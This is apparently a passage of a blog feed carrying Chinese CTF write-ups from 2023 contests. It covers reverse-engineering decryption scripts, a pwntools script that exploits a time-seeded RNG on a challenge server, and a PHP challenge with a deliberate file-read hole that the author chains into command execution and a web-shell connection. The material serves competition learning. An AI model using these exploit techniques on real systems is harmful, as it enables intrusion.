class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Source Generated with Decompyle++</span><br><span class="hljs-comment"># File: baby.pyc (Python 3.8)</span><br><br>a = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;please input your flag:\n&#x27;</span>)<br>check = [<br>    <span class="hljs-number">102</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">99</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">114</span>,<br>    <span class="hljs-number">88</span>,<br>    <span class="hljs-number">97</span>,<br>    <span class="hljs-number">122</span>,<br>    <span class="hljs-number">85</span>,<br>    <span class="hljs-number">125</span>,<br>    <span class="hljs-number">105</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">119</span>,<br>    <span class="hljs-number">80</span>,<br>    <span class="hljs-number">120</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">98</span>,<br>    <span class="hljs-number">39</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">55</span>,<br>    <span class="hljs-number">106</span>]<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a) == <span class="hljs-number">24</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        <span class="hljs-keyword">if</span> check[i] == <span class="hljs-built_in">ord</span>(a[i]) ^ i:<br>            <span class="hljs-keyword">continue</span><br>            <span class="hljs-built_in">print</span>(yes)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;nononono&#x27;</span>)<br>    <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;nononono&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">check = [<br>    <span class="hljs-number">102</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">99</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">114</span>,<br>    <span class="hljs-number">88</span>,<br>    <span class="hljs-number">97</span>,<br>    <span class="hljs-number">122</span>,<br>    <span class="hljs-number">85</span>,<br>    <span class="hljs-number">125</span>,<br>    <span class="hljs-number">105</span>,<br>    <span class="hljs-number">127</span>,<br>    <span class="hljs-number">119</span>,<br>    <span class="hljs-number">80</span>,<br>    <span class="hljs-number">120</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">98</span>,<br>    <span class="hljs-number">39</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">55</span>,<br>    <span class="hljs-number">106</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(check)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(check[i] ^ i), end=<span class="hljs-string">&quot;&quot;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="初赛-easyapk"><a href="#初赛-easyapk" class="headerlink" title="初赛[easyapk]"></a>初赛[easyapk]</h2><p>密文是<code>HPjVMiy4FxSPc1n0eq52t4jaZ7FNr/qvJMjkusqbG6t8IVzztqflA0VQmVZYgiaC</code>，iv是<code>0123456789ABCDEF</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-reverse1-1.png"></p><p>密钥中e替换成3</p><p><code>final String replaceAll = &quot;reversecarefully&quot;.replaceAll(&quot;e&quot;, &quot;3&quot;);</code></p><p>加密模式是AES</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-reverse1-2.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-reverse1-3.png"></p><h2 id="初赛-luare"><a href="#初赛-luare" class="headerlink" title="初赛[luare]"></a>初赛[luare]</h2><p>先导出lua的字节码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-reverse2-1.png"></p><p>修补文件头为<code>1B 4C 7561 52</code>，其中52是版本号</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-reverse2-2.png"></p><p>使用unluac反编译</p><p><code>java -jar unluac.jar out &gt; out.lua</code></p><p>得到</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CheckAns</span><span class="hljs-params">(data)</span></span><br>  <span class="hljs-keyword">if</span> #data ~= <span class="hljs-number">40</span> <span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>  <span class="hljs-keyword">end</span><br>  dataOut = Oo00Oo0(data)<br>  enc = &#123;<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">-73</span>,<br>    <span class="hljs-number">-72</span>,<br>    <span class="hljs-number">46</span>,<br>    <span class="hljs-number">-73</span>,<br>    <span class="hljs-number">-5</span>,<br>    <span class="hljs-number">99</span>,<br>    <span class="hljs-number">-100</span>,<br>    <span class="hljs-number">46</span>,<br>    <span class="hljs-number">59</span>,<br>    <span class="hljs-number">32</span>,<br>    <span class="hljs-number">-76</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">59</span>,<br>    <span class="hljs-number">20</span>,<br>    <span class="hljs-number">-61</span>,<br>    <span class="hljs-number">-56</span>,<br>    <span class="hljs-number">-119</span>,<br>    <span class="hljs-number">48</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">118</span>,<br>    <span class="hljs-number">36</span>,<br>    <span class="hljs-number">118</span>,<br>    <span class="hljs-number">82</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">95</span>,<br>    <span class="hljs-number">106</span>,<br>    <span class="hljs-number">14</span>,<br>    <span class="hljs-number">-80</span>,<br>    <span class="hljs-number">5</span>,<br>    <span class="hljs-number">-89</span>,<br>    <span class="hljs-number">89</span>,<br>    <span class="hljs-number">-85</span>,<br>    <span class="hljs-number">5</span>,<br>    <span class="hljs-number">14</span>,<br>    <span class="hljs-number">46</span>,<br>    <span class="hljs-number">-73</span>,<br>    <span class="hljs-number">7</span>,<br>    <span class="hljs-number">127</span><br>  &#125;<br>  i = <span class="hljs-number">1</span><br>  <span class="hljs-keyword">while</span> i &lt;= #dataOut <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> dataOut[i] ~= enc[i] <span class="hljs-keyword">then</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>    i = i + <span class="hljs-number">1</span><br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br><span class="hljs-keyword">end</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;input: &quot;</span>)<br><span class="hljs-keyword">local</span> data = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">read</span>()<br><span class="hljs-keyword">if</span> CheckAns(data) <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;true&quot;</span>)<br><span class="hljs-keyword">else</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;false&quot;</span>)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>分析<code>Oo00Oo0</code>函数，简单异或</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-reverse2-3.png"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">v7=[<span class="hljs-number">0</span>]*<span class="hljs-number">32</span><br>v7= [<span class="hljs-number">0x60856D1028C8953C</span>,<span class="hljs-number">0x964849764CB30359</span>,<span class="hljs-number">0x2E7164C479B75FB8</span>,<span class="hljs-number">0x80637291A7AC8C38</span>,<span class="hljs-number">0x7B8BF3AE4B339EB0</span>,\<br>    <span class="hljs-number">0xCFE06FEC52B45B4D</span>,<span class="hljs-number">0x5DC67EAAB20C3AD</span>,<span class="hljs-number">0x24FCFBD656409F00</span>,<span class="hljs-number">0x4AF00D463D0BCA92</span>,<span class="hljs-number">0x7DBC8A3B1A11555A</span>,<span class="hljs-number">0x3061CE7513A9E76C</span>,\<br>    <span class="hljs-number">0x9C54D007276AA614</span>,<span class="hljs-number">0x34C20158D8898E5C</span>,<span class="hljs-number">0x50A02AC02F3569E8</span>,<span class="hljs-number">0xC0E681D39FF8836</span>,<span class="hljs-number">0xB66E7F18FEB1E693</span>,\<br>    <span class="hljs-number">0x29F5D2E92B315378</span>,<span class="hljs-number">0x41D9DBDE84172C0F</span>,<span class="hljs-number">0x7A45A899A1F71906</span>,<span class="hljs-number">0xE5AA0AAF1BA5233E</span>,<span class="hljs-number">0x9A3A82FAF8E1A4EF</span>,\<br>    <span class="hljs-number">0xC1D173C7651C8FDF</span>,<span class="hljs-number">0x8D9DDD875EA2D7C5</span>,<span class="hljs-number">0x66EE9790CD81C9F9</span>,<span class="hljs-number">0x370874C63F424FDA</span>,<span class="hljs-number">0xB93283E32677CB25</span>,\<br>    <span class="hljs-number">0xBA2D4ED544F2D3BD</span>,<span class="hljs-number">0xBFE421121E049862</span>,<span class="hljs-number">0xA31694FDF486F647</span>,<span class="hljs-number">0x430251B27C701FEB</span>,<span class="hljs-number">0x5DE26B097ECC1522</span>,<span class="hljs-number">0xF157EDD4B5BE9BBB</span>]<br>table=<span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v7:<br>  table+=i.to_bytes(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>table=<span class="hljs-built_in">list</span>(table)<br>enc=[<span class="hljs-number">109</span>,-<span class="hljs-number">73</span>,-<span class="hljs-number">72</span>,<span class="hljs-number">46</span>,-<span class="hljs-number">73</span>,-<span class="hljs-number">5</span>,<span class="hljs-number">99</span>,-<span class="hljs-number">100</span>,<span class="hljs-number">46</span>,<span class="hljs-number">59</span>,<span class="hljs-number">32</span>,-<span class="hljs-number">76</span>,<span class="hljs-number">109</span>,<span class="hljs-number">3</span>,<span class="hljs-number">59</span>,<span class="hljs-number">20</span>,-<span class="hljs-number">61</span>,-<span class="hljs-number">56</span>,\<br>     -<span class="hljs-number">119</span>,<span class="hljs-number">48</span>,<span class="hljs-number">100</span>,<span class="hljs-number">118</span>,<span class="hljs-number">36</span>,<span class="hljs-number">118</span>,<span class="hljs-number">82</span>,<span class="hljs-number">3</span>,<span class="hljs-number">95</span>,<span class="hljs-number">106</span>,<span class="hljs-number">14</span>,-<span class="hljs-number">80</span>,<span class="hljs-number">5</span>,-<span class="hljs-number">89</span>,<span class="hljs-number">89</span>,-<span class="hljs-number">85</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">46</span>,-<span class="hljs-number">73</span>,<span class="hljs-number">7</span>,<span class="hljs-number">127</span>]<br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(enc):<br>  enc[i]=v&amp;<span class="hljs-number">0xff</span><br><br>flag=[]<br>flag.insert(<span class="hljs-number">0</span>,table.index(enc[-<span class="hljs-number">1</span>]))<br>ind=<span class="hljs-built_in">len</span>(enc)-<span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> ind&gt;=<span class="hljs-number">0</span>:<br>  flag.insert(<span class="hljs-number">0</span>,table.index(enc[ind])^flag[<span class="hljs-number">0</span>])<br>  ind-=<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(flag))<br></code></pre></td></tr></table></figure><h2 id="决赛-Ez8or"><a href="#决赛-Ez8or" class="headerlink" title="决赛[Ez8or]"></a>决赛[Ez8or]</h2><p>加密数据再次异或后得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>a=[  <span class="hljs-number">168</span>, <span class="hljs-number">172</span>,  <span class="hljs-number">54</span>, <span class="hljs-number">106</span>, <span class="hljs-number">196</span>,  <span class="hljs-number">10</span>, <span class="hljs-number">154</span>, <span class="hljs-number">220</span>,  <span class="hljs-number">18</span>,  <span class="hljs-number">72</span>,<br>  <span class="hljs-number">242</span>,  <span class="hljs-number">96</span>, <span class="hljs-number">203</span>, <span class="hljs-number">204</span>,  <span class="hljs-number">58</span>,  <span class="hljs-number">94</span>, <span class="hljs-number">242</span>,  <span class="hljs-number">99</span>, <span class="hljs-number">156</span>, <span class="hljs-number">148</span>,<br>  <span class="hljs-number">245</span>,  <span class="hljs-number">72</span>, <span class="hljs-number">205</span>,  <span class="hljs-number">23</span>, <span class="hljs-number">130</span>, <span class="hljs-number">205</span>, <span class="hljs-number">247</span>, <span class="hljs-number">113</span>, <span class="hljs-number">159</span>,  <span class="hljs-number">54</span>,<br>  <span class="hljs-number">180</span>, <span class="hljs-number">136</span>, <span class="hljs-number">175</span>,  <span class="hljs-number">95</span>, <span class="hljs-number">221</span>, <span class="hljs-number">100</span>, <span class="hljs-number">133</span>, <span class="hljs-number">150</span>, <span class="hljs-number">247</span>,  <span class="hljs-number">94</span>,<br>  <span class="hljs-number">196</span>,   <span class="hljs-number">9</span>, <span class="hljs-number">173</span>, <span class="hljs-number">221</span>, <span class="hljs-number">171</span>,  <span class="hljs-number">22</span>, <span class="hljs-number">153</span>,  <span class="hljs-number">96</span>, <span class="hljs-number">155</span>, <span class="hljs-number">222</span>,<br>  <span class="hljs-number">245</span>,  <span class="hljs-number">83</span>, <span class="hljs-number">195</span>,  <span class="hljs-number">33</span>, <span class="hljs-number">252</span>, <span class="hljs-number">128</span>, <span class="hljs-number">248</span>,  <span class="hljs-number">16</span>, <span class="hljs-number">199</span>,  <span class="hljs-number">38</span>]<br><br>p=process(<span class="hljs-string">&quot;./Ez8or&quot;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>gdb.attach(p,<span class="hljs-string">&#x27;bp $rebase(0x1476)&#x27;</span>)<br><span class="hljs-comment"># 修改加密函数的参数为密文地址，函数结束后，查看密文地址处储存的信息</span><br>pause()<br>p.sendline(<span class="hljs-built_in">bytes</span>(a))<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="决赛-SafeNote"><a href="#决赛-SafeNote" class="headerlink" title="决赛[SafeNote]"></a>决赛[SafeNote]</h2><p>伪随机数，先获取密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> CDLL<br><br>lib=CDLL(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>p=process(<span class="hljs-string">&quot;SafeNote&quot;</span>)<br>i=<span class="hljs-number">96</span><br><span class="hljs-keyword">while</span> i&gt;<span class="hljs-number">0</span>:<br>    p=remote(<span class="hljs-string">&quot;10.1.101.234&quot;</span>,<span class="hljs-number">9999</span>)<br>    t=lib.time(<span class="hljs-number">0</span>)<br>    p1=process(<span class="hljs-string">&quot;./a.out&quot;</span>)<br>    p1.sendline(<span class="hljs-built_in">str</span>(i))<br>    p.readuntil(<span class="hljs-string">&quot;N =&quot;</span>)<br>    d2=<span class="hljs-built_in">int</span>(p.readline())<br>    p.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.readuntil(<span class="hljs-string">&quot;password = &quot;</span>)<br>    d=<span class="hljs-built_in">int</span>(p.readline().strip().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    p1.send(<span class="hljs-built_in">str</span>(d))<br>    p1.readuntil(<span class="hljs-string">&#x27;n:&#x27;</span>)<br>    d1=<span class="hljs-built_in">int</span>(p1.readline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>).strip())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n(1): &quot;</span>+<span class="hljs-built_in">str</span>(d2))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n(2): &quot;</span>+<span class="hljs-built_in">str</span>(d1))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nu: &quot;</span>+<span class="hljs-built_in">str</span>(i))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;time: &quot;</span>+<span class="hljs-built_in">str</span>(t))<br>    <span class="hljs-keyword">if</span> d2!=d1:<br>        p.close()<br>        p1.close()<br>        i-=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">break</span><br>p1.readuntil(<span class="hljs-string">&#x27;data:&#x27;</span>)<br>d=p1.readline()<br><span class="hljs-built_in">print</span>(d)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>rsa解密得到password，然后将password发送给靶机得到flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;gmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">gmp_randstate_t</span> gmp_state;<br>__mpz_struct p,q,n_,e,p_1,q_1,lambda,d_;<br>__mpz_struct secret,msg;<br><span class="hljs-type">char</span>* data,data1;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>data=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2000</span>);<br>data1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2000</span>);<br>__gmpz_inits(&amp;p,&amp;q,&amp;n_,&amp;e,&amp;p_1,&amp;q_1,&amp;lambda,&amp;d_,&amp;secret,&amp;msg,<span class="hljs-number">0</span>);<br>__gmp_randinit_mt(&amp;gmp_state);<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>,&amp;num);<br>__gmp_randseed_ui(&amp;gmp_state,time(<span class="hljs-number">0</span>)+num);<br>__gmpz_urandomb(&amp;q,&amp;gmp_state,<span class="hljs-number">256</span>);<br>__gmpz_nextprime(&amp;q,&amp;q);<br>__gmpz_urandomb(&amp;p,&amp;gmp_state,<span class="hljs-number">256</span>);<br>__gmpz_nextprime(&amp;p,&amp;p);<br> __gmpz_mul(&amp;n_, &amp;p, &amp;q);<br>  __gmpz_set_ui(&amp;e, <span class="hljs-number">65537LL</span>);<br>  __gmpz_sub_ui(&amp;p_1, &amp;p, <span class="hljs-number">1LL</span>);<br>  __gmpz_sub_ui(&amp;q_1, &amp;q, <span class="hljs-number">1LL</span>);<br>  __gmpz_lcm(&amp;lambda, &amp;p_1, &amp;q_1);<br>  __gmpz_invert(&amp;d_, &amp;e, &amp;lambda);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;n: %s\n&quot;</span>,__gmpz_get_str(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,&amp;n_));<br>read(<span class="hljs-number">0</span>,data,<span class="hljs-number">0x100</span>);<br>__gmpz_set_str(&amp;secret,data,<span class="hljs-number">10</span>);<br>__gmpz_powm(&amp;msg,&amp;secret,&amp;d_,&amp;n_);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: %s\n&quot;</span>,__gmpz_get_str(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,&amp;msg));<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;初赛-easy-php&quot;&gt;&lt;a href=&quot;#初赛-easy-php&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="2023" scheme="https://www.dr0n.top/tags/2023/"/>
    
    <category term="浙江" scheme="https://www.dr0n.top/tags/%E6%B5%99%E6%B1%9F/"/>
    
  </entry>
  
  <entry>
    <title>2023台州市第三届网络安全大赛wp</title>
    <link href="https://www.dr0n.top/posts/8779ab40/"/>
    <id>https://www.dr0n.top/posts/8779ab40/</id>
    <published>2023-09-27T06:00:00.000Z</published>
    <updated>2024-02-29T08:47:27.923Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="briefphp"><a href="#briefphp" class="headerlink" title="briefphp"></a>briefphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--&lt;a href=<span class="hljs-string">&quot;/?source&quot;</span>&gt;source&lt;/a&gt;--&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>)  <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;./shell.php&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br><br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;&lt;!DOCTYPE&#x27;</span>) === False) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;failed to read&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nothing here&#x27;</span>);<br>    &#125;<br><br><span class="hljs-meta">?&gt;</span> nothing here<br></code></pre></td></tr></table></figure><p>只能读取以<code>&lt;!DOCTYPE</code>开头的文件，直接用<code>php_filter_chain_generator</code>构造</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-1.png"></p><p>读取shell.php</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-2.png"></p><p>然后文件包含转命令执行</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-3.png"></p><p>蚁剑连接拿到flag</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="这是神马"><a href="#这是神马" class="headerlink" title="这是神马"></a>这是神马</h2><p>流量分析，导出http对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 